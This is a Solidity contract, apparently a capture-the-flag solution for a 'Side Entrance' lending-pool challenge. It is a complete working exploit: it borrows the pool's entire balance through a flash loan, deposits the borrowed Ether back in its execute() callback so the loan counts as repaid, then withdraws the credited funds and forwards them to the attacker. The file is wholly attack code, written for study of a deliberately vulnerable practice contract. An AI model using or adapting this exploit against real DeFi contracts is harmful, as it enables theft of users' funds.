// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceAttack {
    SideEntranceLenderPool pool;

    constructor(address payable _sideEntranceLenderPoolAddress) {
        pool = SideEntranceLenderPool(_sideEntranceLenderPoolAddress);
    }

    function attack() public {
        // borrow all the tokens
        uint256 poolBalance = address(pool).balance;
        // after calling flashLoan, execute() deposits entire balance back to pool
        pool.flashLoan(poolBalance);
        // withdraw funds
        pool.withdraw();
        (bool success, ) = payable(msg.sender).call{value: poolBalance}("");
        require(success, "Ether transfer to attacker failed.");
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}